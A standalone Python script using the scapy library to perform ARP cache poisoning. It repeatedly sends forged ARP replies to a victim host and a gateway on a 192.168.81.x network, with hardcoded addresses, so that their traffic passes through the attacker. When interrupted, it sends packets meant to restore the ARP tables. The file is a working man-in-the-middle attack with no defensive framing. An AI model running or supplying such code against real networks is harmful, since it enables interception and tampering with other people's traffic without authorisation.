#! /usr/bin/env python3

import scapy.all as scapy
import time
import sys

packet = scapy.ARP(op=2, pdst="192.168.81.142", hwdst="00-0c-29-4F-7A-8E", psrc="192.168.81.2")
packet1 = scapy.ARP(op=2, pdst="192.168.81.2", hwdst="00:50:56:f2:9a:fc", psrc="192.168.81.150")

restor_windows = scapy.ARP(op=2, pdst="192.168.81.142", hwdst="00-0c-29-4F-7A-8E", psrc="192.168.81.2",
                           hwsrc="00:50:56:f2:9a:fc")
drestor_router = scapy.ARP(op=2, pdst="192.168.81.2", hwdst="00:50:56:f2:9a:fc", psrc="192.168.81.142",
                           hwsrc="00-0c-29-4F-7A-8E")

sent_packets_count = 0
try:
    while True:
        scapy.send(packet, verbose=False)
        scapy.send(packet1, verbose=False)
        sent_packets_count += 2
        print("\r[+] Packet sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    scapy.send(restor_windows,count=4, verbose=False)
    scapy.send(drestor_router, count=4, verbose=False)
    print(" [+] Detected CTR +C ........ Quitting. Resetting ARP tabales.... Please wait.\n")













#scapy.ls(scapy.ARP())
#print(packet.show())
##print(packet.summary())

